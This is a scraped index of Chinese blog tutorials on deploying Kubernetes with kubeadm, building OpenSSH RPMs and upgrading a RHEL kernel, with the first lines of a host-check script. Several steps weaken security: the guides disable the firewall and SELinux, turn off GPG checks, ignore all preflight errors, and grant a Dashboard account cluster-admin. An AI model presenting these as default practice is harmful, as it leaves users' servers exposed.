--kubernetes-version=v1.18.6 --apiserver-advertise-address=192.168.1.14 --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 等待集群初始化完成。。。\nkubeadm join 192.168.1.14:6443 --token utml0h.gj2nafii8xm1512e \\ --discovery-token-ca-cert-hash sha256:e91fb35667cf51c76b9afa288e4416a1314a1244158123ffbcee55b7ac4a70d4 上面命令记录下来，这是将 node 节点加入到 集群的执行操作命令。\n出现如上提示，集群初始化成功，执行提示命令：\n[root@k8s-master ~]# mkdir -p $HOME/.kube [root@k8s-master ~]# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [root@k8s-master ~]# chown $(id -u):$(id -g) $HOME/.kube/config 使用 kubectl 查看 nodes\n[root@k8s-master ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master NotReady master 74s v1.18.6 初始化网络插件 flannel # 进入压缩后的目录里 [root@k8s-master ~]# cd k8s-kubeadm/ # 开始进行 flannel 初始化安装 [root@k8s-master k8s-kubeadm]# kubectl apply -f kube-flannel.yml podsecuritypolicy.policy/psp.flannel.unprivileged created clusterrole.rbac.authorization.k8s.io/flannel created clusterrolebinding.rbac.authorization.k8s.io/flannel created serviceaccount/flannel created configmap/kube-flannel-cfg created daemonset.apps/kube-flannel-ds created flannel 初始化完成后，查看 nodes 状态：\n[root@k8s-master k8s-kubeadm]# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master Ready master 3m58s v1.18.6 到此，通过 kubeadm 初始化安装 master 节点完毕。接下来是 node 节点就很简单。\n部署node节点 将下载的压缩包拷贝到 node 节点执行 [root@k8s-master ~]# scp k8s-kubeadm.tar.gz 192.168.1.15:/root/ ------以下node节点执行------ [root@localhost ~]# ls anaconda-ks.cfg k8s-kubeadm.tar.gz [root@localhost ~]# tar xf k8s-kubeadm.tar.gz [root@localhost ~]# cd k8s-kubeadm/ # ./install.sh 主机名 [root@localhost k8s-kubeadm]# ./install.sh k8s-node1 这里和上面 master 初始化一样，完成后重启主机。\n重启完成后，执行 join 命令加入集群 # 就是上面记录的命令 kubeadm join 192.168.1.14:6443 --token utml0h.gj2nafii8xm1512e \\ --discovery-token-ca-cert-hash sha256:e91fb35667cf51c76b9afa288e4416a1314a1244158123ffbcee55b7ac4a70d4 切换到 k8s-master 查看 k8s-node1 是否加入集群 k8s-node1 成功加入集群，剩下的 node 节点都是一样的操作。\n到此，通过 kubeadm 搭建 k8s 环境已经完成。\nk8s 集群简单测试 注意：本节测试需要网络拉取镜像，可以通过网络将 镜像拷贝到主机里 所需镜像： nginx:alpine / busybox\n这里做一个简单的小测试来证明集群是健康正常运行的。\n创建一个 nginx pod [root@k8s-master ~]# kubectl run nginx-deploy --image=nginx:alpine pod/nginx-deploy created [root@k8s-master ~]# kubectl get pods NAME READY STATUS RESTARTS AGE nginx-deploy 1/1 Running 0 11s [root@k8s-master ~]# kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-deploy 1/1 Running 0 18s 10.244.1.2 k8s-node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 为 nginx pod 创建一个服务 [root@k8s-master ~]# kubectl expose pod nginx-deploy --name=nginx --port=80 --target-port=80 --protocol=TCP service/nginx exposed [root@k8s-master ~]# kubectl get service NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 21m nginx ClusterIP 10.106.14.253 \u0026lt;none\u0026gt; 80/TCP 9s [root@k8s-master ~]# curl 10.106.14.253 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 创建一个 busybox pod 来通过 nginx 服务名访问 [root@k8s-master ~]# kubectl run client --image=busybox -it If you don\u0026#39;t see a command prompt, try pressing enter. ------ 通过服务名来访问 nginx 服务 ------ / # wget -O - -q nginx \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; / # cat /etc/resolv.conf nameserver 10.96.0.10 search default.svc.cluster.local svc.cluster.local cluster.local options ndots:5 测试通过，网络及dns服务正常。集群处于正常健康状态。\n参考 https://www.cnblogs.com/hukey/p/13773927.html\n","permalink":"https://www.lvbibir.cn/posts/tech/kubeadm_deploy_k8s_v1.18.6_offline/","summary":"Kubernetes 概述 kubernetes 是什么 kubernetes 是 Google 在 2014年开源的一个容器集群管理平台，kubernetes简称 k8s k8s用于容器化应用程序的部署，扩展和管理。 k8s提供","title":"kubeadm 搭建 k8s 集群 [离线版] v1.18.6"},{"content":"前言 kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。\n这个工具能通过两条指令完成一个kubernetes集群的部署：\n# 创建一个 Master 节点 $ kubeadm init # 将一个 Node 节点加入到当前集群中 $ kubeadm join \u0026lt;Master节点的IP和端口 \u0026gt; 1. 安装要求 在开始之前，部署Kubernetes集群机器需要满足以下几个条件：\n一台或多台机器，操作系统 CentOS7.x-86_x64 硬件配置：2GB或更多RAM，2个CPU或更多CPU，硬盘30GB或更多 集群中所有机器之间网络互通 可以访问外网，需要拉取镜像 禁用swap分区 2. 准备环境 角色 IP k8s-master 192.168.150.101 k8s-node1 192.168.150.102 k8s-node2 192.168.150.103 关闭防火墙： $ systemctl stop firewalld $ systemctl disable firewalld 关闭selinux： $ sed -i \u0026#39;s/enforcing/disabled/\u0026#39; /etc/selinux/config # 永久 $ setenforce 0 # 临时 关闭swap： $ swapoff -a # 临时 $ vim /etc/fstab # 永久 注释掉swap分区相关行 设置主机名： $ hostnamectl set-hostname \u0026lt;hostname\u0026gt; 在master添加hosts： $ cat \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt; EOF 192.168.150.101 k8s-master 192.168.150.102 k8s-node1 192.168.150.103 k8s-node2 EOF 将桥接的IPv4流量传递到iptables的链： $ cat \u0026gt; /etc/sysctl.d/k8s.conf \u0026lt;\u0026lt; EOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF $ sysctl --system # 生效 时间同步： $ yum install ntpdate -y $ ntpdate time.windows.com 3. 安装 Docker/kubeadm/kubelet/kubectl (所有节点) Kubernetes默认CRI（容器运行时）为Docker，因此先安装Docker。\n3.1 安装Docker $ wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo $ yum -y install docker-ce $ systemctl enable docker \u0026amp;\u0026amp; systemctl start docker 3.2 配置镜像下载加速器，同时修改docker的cgroupdriver为systemd $ cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt; EOF { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://jc0srqak.mirror.aliyuncs.com\u0026#34;], \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } EOF $ systemctl restart docker $ docker info 3.3 添加阿里云YUM软件源 $ cat \u0026gt; /etc/yum.repos.d/kubernetes.repo \u0026lt;\u0026lt; EOF [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF 3.4 安装kubeadm，kubelet和kubectl 由于版本更新频繁，这里指定版本号部署：\n$ yum install -y kubelet-1.22.3 kubeadm-1.22.3 kubectl-1.22.3 $ systemctl enable kubelet $ systemctl start kubelet 4. 部署Kubernetes Master https://kubernetes.io/zh/docs/reference/setup-tools/kubeadm/kubeadm-init/#config-file\nhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/#initializing-your-control-plane-node\n在192.168.150.101（Master）执行。\n$ kubeadm init \\ --apiserver-advertise-address=192.168.150.101 \\ --kubernetes-version v1.22.3 \\ --service-cidr=10.96.0.0/12 \\ --pod-network-cidr=10.244.0.0/16 \\ --ignore-preflight-errors=all \\ --image-repository registry.aliyuncs.com/google_containers \u0026ndash;apiserver-advertise-address 集群通告地址 \u0026ndash;kubernetes-version K8s版本，与上面安装的一致 \u0026ndash;service-cidr 集群内部虚拟网络，Pod统一访问入口 \u0026ndash;pod-network-cidr Pod网络，与下面部署的CNI网络组件yaml中保持一致 \u0026ndash;ignore-preflight-errors=all，跳过一些错误 \u0026ndash;image-repository 由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址 或者使用配置文件引导：\n$ vi kubeadm.conf apiVersion: kubeadm.k8s.io/v1beta2 kind: ClusterConfiguration kubernetesVersion: v1.22.3 imageRepository: registry.aliyuncs.com/google_containers networking: podSubnet: 10.244.0.0/16 serviceSubnet: 10.96.0.0/12 $ kubeadm init --config kubeadm.conf --ignore-preflight-errors=all 拷贝kubectl使用的连接k8s认证文件到默认路径：\nmkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config $ kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master Ready master 2m v1.18.0 5. 加入Kubernetes Node 在192.168.150.102/103（Node）执行。\n向集群添加新节点，执行在kubeadm init输出的kubeadm join命令：\n$ kubeadm join 192.168.150.101:6443 --token esce21.q6hetwm8si29qxwn \\ --discovery-token-ca-cert-hash sha256:00603a05805807501d7181c3d60b478788408cfe6cedefedb1f97569708be9c5 默认token有效期为24小时，当过期之后，该token就不可用了。这时就需要重新创建token，操作如下：\n$ kubeadm token create $ kubeadm token list $ openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2\u0026gt;/dev/null | openssl dgst -sha256 -hex | sed \u0026#39;s/^.* //\u0026#39; 63bca849e0e01691ae14eab449570284f0c3ddeea590f8da988c07fe2729e924 $ kubeadm join 192.168.150.101:6443 --token nuja6n.o3jrhsffiqs9swnu --discovery-token-ca-cert-hash sha256:63bca849e0e01691ae14eab449570284f0c3ddeea590f8da988c07fe2729e924 或者直接命令快捷生成：kubeadm token create \u0026ndash;print-join-command\nhttps://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-join/\n6. 部署容器网络（CNI） https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/#pod-network\n注意：只需要部署下面其中一个，推荐Calico。\nCalico是一个纯三层的数据中心网络方案，Calico支持广泛的平台，包括Kubernetes、OpenStack等。\nCalico 在每一个计算节点利用 Linux Kernel 实现了一个高效的虚拟路由器（ vRouter） 来负责数据转发，而每个 vRouter 通过 BGP 协议负责把自己上运行的 workload 的路由信息向整个 Calico 网络内传播。\n此外，Calico 项目还实现了 Kubernetes 网络策略，提供ACL功能。\nhttps://docs.projectcalico.org/getting-started/kubernetes/quickstart\n$ wget https://docs.projectcalico.org/manifests/calico.yaml 下载完后还需要修改里面定义Pod网络（CALICO_IPV4POOL_CIDR），与前面kubeadm init指定的一样\n修改完后应用清单：\n$ kubectl apply -f calico.yaml $ kubectl get pods -n kube-system 7. 测试kubernetes集群 验证Pod工作 验证Pod网络通信 验证DNS解析 在Kubernetes集群中创建一个pod，验证是否正常运行：\n$ kubectl create deployment nginx --image=nginx $ kubectl expose deployment nginx --port=80 --type=NodePort $ kubectl get pod,svc 访问地址：http://NodeIP:Port\n8. 部署 Dashboard $ wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml 默认Dashboard只能集群内部访问，修改Service为NodePort类型，暴露到外部：\n$ vi recommended.yaml ... kind: Service apiVersion: v1 metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboard spec: ports: - port: 443 targetPort: 8443 nodePort: 30001 selector: k8s-app: kubernetes-dashboard type: NodePort ... $ kubectl apply -f recommended.yaml $ kubectl get pods -n kubernetes-dashboard NAME READY STATUS RESTARTS AGE dashboard-metrics-scraper-6b4884c9d5-gl8nr 1/1 Running 0 13m kubernetes-dashboard-7f99b75bf4-89cds 1/1 Running 0 13m 访问地址：https://NodeIP:30001\n创建service account并绑定默认cluster-admin管理员集群角色：\n# 创建用户 $ kubectl create serviceaccount dashboard-admin -n kube-system # 用户授权 $ kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --serviceaccount=kube-system:dashboard-admin # 获取用户Token $ kubectl describe secrets -n kube-system $(kubectl -n kube-system get secret | awk \u0026#39;/dashboard-admin/{print $1}\u0026#39;) 使用输出的token登录Dashboard。\n","permalink":"https://www.lvbibir.cn/posts/tech/kubeadm_deploy_k8s_v1.22.3/","summary":"前言 kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。 这个工具能通过两条指令完成一个kubernetes集群的部","title":"kubeadm快速搭建K8s集群v1.22.3"},{"content":"openssh-8.7p1 编译环境 编译平台：\tvmware workstation\n系统版本：\t普华服务器操作系统v4.0\n系统内核：\t3.10.0-327.el7.isoft.x86_64\n软件版本：\topenssh-8.7p1.tar.gz x11-ssh-askpass-1.2.4.1.tar.gz\n编译步骤 yum安装依赖工具\nyum install wget vim gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel unzip krb5-devel libX11-devel initscripts -y 创建编译目录\nmkdir -p /root/rpmbuild/{SOURCES,SPECS} 下载openssh编译包和x11-ssh-askpass依赖包并解压修改配置\ncd /root/rpmbuild/SOURCES wget https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-8.7p1.tar.gz wget https://src.fedoraproject.org/repo/pkgs/openssh/x11-ssh-askpass-1.2.4.1.tar.gz/8f2e41f3f7eaa8543a2440454637f3c3/x11-ssh-askpass-1.2.4.1.tar.gz tar -zxvf openssh-8.7p1.tar.gz cp openssh-8.7p1/contrib/redhat/openssh.spec /root/rpmbuild/SPECS/ sed -i -e \u0026#34;s/%define no_x11_askpass 0/%define no_x11_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec sed -i -e \u0026#34;s/%define no_gnome_askpass 0/%define no_gnome_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec 准备编译\nvim /root/rpmbuild/SPECS/openssh.spec 注释掉 BuildRequires: openssl-devel \u0026lt; 1.1 这一行 开始编译\nrpmbuild -ba /root/rpmbuild/SPECS/openssh.spec 操作验证\ncd /root/rpmbuild/RPMS/x86_64/ vim run.sh #!/bin/bash set -e cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp -r /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd chmod 755 run.sh ./run.sh ssh -V 打包归档\n[root@localhost ~]# cd /root/rpmbuild/RPMS/x86_64/ [root@localhost x86_64]# ls openssh-8.7p1-1.el7.isoft.x86_64.rpm openssh-askpass-8.7p1-1.el7.isoft.x86_64.rpm openssh-askpass-gnome-8.7p1-1.el7.isoft.x86_64.rpm openssh-clients-8.7p1-1.el7.isoft.x86_64.rpm openssh-debuginfo-8.7p1-1.el7.isoft.x86_64.rpm openssh-server-8.7p1-1.el7.isoft.x86_64.rpm run.sh [root@localhost x86_64]# vim run.sh #!/bin/bash cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp -r /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd [root@localhost x86_64]# tar zcvf openssh-8.7p1.rpm.x86_64.tar.gz ./* [root@localhost x86_64]# mv openssh-8.7p1.rpm.x86_64.tar.gz /root 使用 tar zxf openssh-8.7p1.rpm.x86_64.tar.gz ./run.sh openssh-9.0p1 编译环境 编译平台：\tvmware workstation\n系统版本：\t普华服务器操作系统v3.0\n系统内核：\t2.6.32-279.el6.isoft.x86_64\n软件版本：\topenssh-9.0p1.tar.gz x11-ssh-askpass-1.2.4.1.tar.gz\n编译步骤 添加阿里云yum源\ncurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-6.10.repo yum安装依赖工具\nyum install wget vim gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel unzip krb5-devel libX11-devel initscripts -y 创建编译目录\nmkdir -p /root/rpmbuild/{SOURCES,SPECS} 下载openssh编译包和x11-ssh-askpass依赖包并解压修改配置\ncd /root/rpmbuild/SOURCES wget https://mirrors.aliyun.com/pub/OpenBSD/OpenSSH/portable/openssh-9.0p1.tar.gz wget https://src.fedoraproject.org/repo/pkgs/openssh/x11-ssh-askpass-1.2.4.1.tar.gz/8f2e41f3f7eaa8543a2440454637f3c3/x11-ssh-askpass-1.2.4.1.tar.gz tar -zxf openssh-9.0p1.tar.gz cp openssh-9.0p1/contrib/redhat/openssh.spec /root/rpmbuild/SPECS/ sed -i -e \u0026#34;s/%define no_x11_askpass 0/%define no_x11_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec sed -i -e \u0026#34;s/%define no_gnome_askpass 0/%define no_gnome_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec 添加缺少的文件\ncd /root/rpmbuild/SOURCES/openssh-9.0p1/contrib/redhat cp sshd.init sshd.init.old cp sshd.pam sshd.pam.old 重新打包，否则会报错找不到 sshd.pam.old 和 sshd.init.old\ncd /root/rpmbuild/SOURCES/ tar zcf openssh-9.0p1.tar.gz openssh-9.0p1 准备编译\nvim /root/rpmbuild/SPECS/openssh.spec 注释掉 BuildRequires: openssl-devel \u0026lt; 1.1 这一行 开始编译\nrpmbuild -ba /root/rpmbuild/SPECS/openssh.spec 准备目录\nmkdir -pv /root/openssh-9.0p1-rpms/openssl-1.0.1e-rpms/ cp /root/rpmbuild/RPMS/x86_64/* /root/openssh-9.0p1-rpms/ 下载 openssl-1.0.1e 离线包\n这步由于之前安装编译的依赖的时候已经安装过，可以用全新的系统重新下载 openssl-1.0.1e 的依赖\nyum install -y yum-plugin-downloadonly yum install openssl openssl-devel --downloadonly --downloaddir=/root/openssh-9.0p1-rpms/openssl-1.0.1e-rpms/ 编写升级脚本\ncat \u0026gt; /root/openssh-9.0p1-rpms/run.sh \u0026lt;\u0026lt;EOF #!/bin/bash set -e cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -e --nodeps libsepol-2.0.41-4.el6.isoft.x86_64 rpm -Uvh ./openssl-1.0.1e-rpms/*.rpm rpm -Uvh ./*.rpm cp /etc/pam.d/sshd_bak /etc/pam.d/sshd cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key service sshd restart EOF 打包\ntar zcf openssh-9.0p1-rpms.tar.gz openssh-9.0p1-rpms 使用 tar zxf openssh-9.0p1-rpms.tar.gz cd openssh-9.0p1-rpms ./run.sh openssh-8.6p1-aarch64 编译环境 系统版本：普华服务器操作系统openeuler版\n系统内核：4.19.90-2003.4.0.0036.oe1.aarch64\n软件版本：\nopenssh-8.6p1.tar.gz\nx11-ssh-askpass-1.2.4.1.tar.gz\n编译步骤 dnf安装依赖工具\ndnf install gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel unzip krb5-devel libX11-devel initscripts -y 创建编译目录\nmkdir -p /root/rpmbuild/{SOURCES,SPECS} 下载openssh编译包和x11-ssh-askpass依赖包并解压修改配置\ncd /root/rpmbuild/SOURCES wget https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-8.6p1.tar.gz wget https://src.fedoraproject.org/repo/pkgs/openssh/x11-ssh-askpass-1.2.4.1.tar.gz/8f2e41f3f7eaa8543a2440454637f3c3/x11-ssh-askpass-1.2.4.1.tar.gz tar -zxvf openssh-8.6p1.tar.gz cp openssh-8.6p1/contrib/redhat/openssh.spec /root/rpmbuild/SPECS/ sed -i -e \u0026#34;s/%define no_x11_askpass 0/%define no_x11_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec sed -i -e \u0026#34;s/%define no_gnome_askpass 0/%define no_gnome_askpass 1/g\u0026#34; /root/rpmbuild/SPECS/openssh.spec 准备编译\nvim /root/rpmbuild/SPECS/openssh.spec 注释掉 BuildRequires: openssl-devel \u0026lt; 1.1 这一行 修改下面两行 %attr(4711,root,root) %{_libexecdir}/openssh/ssh-sk-helper %attr(0644,root,root) %{_mandir}/man8/ssh-sk-helper.8.gz 开始编译\nrpmbuild -ba /root/rpmbuild/SPECS/openssh.spec 操作验证\ncd /root/rpmbuild/RPMS/aarch64 vim run.sh #!/bin/bash cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp -r /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd chmod 755 run.sh ./run.sh ssh -V OpenSSH_8.6p1, OpenSSL 1.1.1d 10 Sep 2019 从版本看，ssh已经升级成功。但是每次重启服务都会提示sshd的unit文件发生改变，需要执行systemctl daemon-reload。执行完reload后重启sshd依旧报错Warning: The unit file, source configuration file or drop-ins of sshd.service changed on disk. Run \u0026lsquo;systemctl daemon-reload\u0026rsquo; to reload units. 先不管这个问题，测试下sshd服务是否正常。\n用终端连接试试\n一切正常，如果出现PAM unable to dlopen(/usr/lib64/security/pam_stack.so): /usr/lib64/security/pam_stack.so: cannot open shared object file: No such file or directory类似报错，需要还原原先的/etc/pam.d/sshd文件\n继续看之前那个报错，一般这种错误为服务的配置文件或者unit文件发生改变，需要执行daemon-reload重新加载一下，逐个排查\n查看配置文件 查看unit文件 没有找到sshd.service的unit文件，find查找一下 第一个文件是老版本ssh的残留的自启的unit链接文件，已经失效了。第三个和第四个文件都是第二个文件的链接文件。 不知为何我们自己编译的ssh安装后unit文件会放到这个位置，后续再研究，尝试自己写一份unit文件，试试能不能恢复sshd。\n备份unit文件\n[root@localhost ~]# cp /run/systemd/generator.late/sshd.service /root/sshd.service-20210702 查看unit文件中的控制参数和pid文件位置等 自建一个unit文件，放到/usr/lib/systemd/system目录\n[root@localhost ~]# vim /usr/lib/systemd/system/sshd.service [UNIT] Description=OpenSSH server daemon After=network.target sshd-keygen.target Wants=sshd-keygen.target [Service] Type=forking ExecStart=/etc/rc.d/init.d/sshd start ExecReload=/etc/rc.d/init.d/sshd restart ExecStop=/etc/rc.d/init.d/sshd stop PrivateTmp=True [Install] WantedBy=multi-user.target [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart sshd [root@localhost ~]# systemctl status sshd [root@localhost ~]# ssh -V OpenSSH_8.6p1, OpenSSL 1.1.1d 10 Sep 2019 打包归档\n[root@localhost ~]# cp /usr/lib/systemd/system/sshd.service /root/rpmbuild/RPMS/aarch64/ [root@localhost ~]# cd /root/rpmbuild/RPMS/aarch64/ [root@localhost aarch64]# ls openssh-8.6p1-1.isoft.isoft.aarch64.rpm openssh-debugsource-8.6p1-1.isoft.isoft.aarch64.rpm openssh-askpass-8.6p1-1.isoft.isoft.aarch64.rpm openssh-server-8.6p1-1.isoft.isoft.aarch64.rpm openssh-askpass-gnome-8.6p1-1.isoft.isoft.aarch64.rpm run.sh openssh-clients-8.6p1-1.isoft.isoft.aarch64.rpm sshd.service openssh-debuginfo-8.6p1-1.isoft.isoft.aarch64.rpm [root@localhost aarch64]# vim run.sh #!/bin/bash cp /etc/pam.d/sshd /etc/pam.d/sshd_bak cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak rpm -Uvh ./*.rpm cp /etc/pam.d/sshd_bak /etc/pam.d/ cp /etc/ssh/sshd_config_bak /etc/ssh/sshd_config cp ./sshd.service /usr/lib/systemd/system/sshd.service rm -rf /etc/ssh/ssh*key systemctl daemon-reload systemctl restart sshd systemctl enable sshd [root@localhost aarch64]# tar zcvf openssh-8.6p1-rpm-aarch64.tar.gz ./* [root@localhost aarch64]# mv openssh-8.6p1-rpm-aarch64.tar.gz /root 参考 systemd和sysv的服务管理\nsystemd-sysv-generator 中文手册\n","permalink":"https://www.lvbibir.cn/posts/tech/openssh_src_build_rpm/","summary":"openssh-8.7p1 编译环境 编译平台： vmware workstation 系统版本： 普华服务器操作系统v4.0 系统内核： 3.10.0-327.el7.isoft.x86_64 软件版本： openssh-8.7p1.tar.gz x11-ssh-askpass-1.2.4.1.tar.gz 编译步骤 yum安装依赖工具 yum install wget vim gdb imake libXt-devel gtk2-devel rpm-build zlib-devel openssl-devel gcc perl-devel pam-devel","title":"openssh源码打包编译成rpm包"},{"content":"前言 按指定要求安装升级内核，保证grub2启动时为默认项目\n第一步 确认当前操作系统的内核版本\n[root@server0 ~]# uname -r 3.10.0-123.el7.x86_64\n第二步 下载准备升级的内核文件，比如说内核已存在于某个 Yum 仓库：http://content.example.com/rhel7.0/x86_64/errata\n此时只要添加这个 Yum 源就可以直接下载了。\n[root@server0 ~]# yum-config-manager \u0026ndash;add-repo=\u0026ldquo;http://content.example.com/rhel7.0/x86_64/errata\u0026quot;\n若是第一次配置，还需要导入红帽公钥\n[root@server0 ~]# rpm \u0026ndash;import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-*\n第三步 查找内核，并确认 Yum 仓库中的内核是否为需要升级的内核\n[root@server0 ~]# yum list kernel\n第四步 安装新的内核，若内核文件很大，那安装时间就相对漫长一些。\n[root@server0 ~]# yum -y install kernel\n第五步 检查新内核是否为默认启动内核（若是安装高版本号的内核，默认都会作为优先启动内核）\n[root@server0 ~]# grub2-editenv list saved_entry=Red Hat Enterprise Linux Server (3.10.0-123.1.2.el7.x86_64) 7.0 (Maipo)\n当前默认启动内核已经是刚才升级的内核！如果要手动调整内核启动顺序，需要再进行设置一番。\n第六步 确认当前操作系统有几个启动内核\n当前操作系统有三个内核，其中第一个内核版本为 3.10.0-123.1.2.el7.x86_64，也就是我们刚才升级的内核；第二个内核版本为 3.10.0-123.el7.x86_64，是最初查看的内核版本。\n现在设置第二个内核（3.10.0-123.el7.x86_64）为默认启动内核\n[root@server0 ~]# grub2-set-default \u0026ldquo;Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64\u0026rdquo;\n然后确认一下是否设置成功\n[root@server0 ~]# grub2-editenv list\nsaved_entry=Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64\n重启检查新内核\n[root@server0 ~]# uname -r\n","permalink":"https://www.lvbibir.cn/posts/tech/redhat_update_kernel/","summary":"前言 按指定要求安装升级内核，保证grub2启动时为默认项目 第一步 确认当前操作系统的内核版本 [root@server0 ~]# uname -r 3.10.0-123.el7.x86_64 第二步 下载准备升级的内核文件，比如说内核","title":"redhat服务器升级内核"},{"content":"#!/bin/bash #参数定义 date=`date +\u0026#34;%Y-%m-%d-%H:%M:%S\u0026#34;` centosVersion=$(awk \u0026#39;{print $(NF-1)}\u0026#39; /etc/redhat-release) VERSION=`date +%F` #日志相关 LOGPATH=\u0026#34;/tmp/awr\u0026#34; [ -e $LOGPATH ] || mkdir -p $LOGPATH RESULTFILE=\u0026#34;$LOGPATH/HostCheck-`hostname`-`date +%Y%m%d`.txt\u0026#34; #调用函数库 [ -f /etc/init.d/functions ] \u0026amp;\u0026amp; source 